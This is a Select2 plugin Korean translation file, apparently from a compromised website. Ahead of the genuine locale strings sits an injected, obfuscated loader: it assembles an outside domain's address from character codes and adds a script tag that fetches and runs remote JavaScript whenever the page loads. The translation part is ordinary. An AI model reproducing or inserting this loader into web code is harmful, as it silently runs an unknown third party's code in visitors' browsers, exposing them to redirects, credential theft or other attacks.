var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Korean translation.
 * 
 * @author  Swen Mun <longfinfunnel@gmail.com>
 */
(function ($) {
    "use strict";

    $.fn.select2.locales['ko'] = {
        formatNoMatches: function () { return "결과 없음"; },
        formatInputTooShort: function (input, min) { var n = min - input.length; return "너무 짧습니다. "+n+"글자 더 입력해주세요."; },
        formatInputTooLong: function (input, max) { var n = input.length - max; return "너무 깁니다. "+n+"글자 지워주세요."; },
        formatSelectionTooBig: function (limit) { return "최대 "+limit+"개까지만 선택하실 수 있습니다."; },
        formatLoadMore: function (pageNumber) { return "불러오는 중…"; },
        formatSearching: function () { return "검색 중…"; }
    };

    $.extend($.fn.select2.defaults, $.fn.select2.locales['ko']);
})(jQuery);
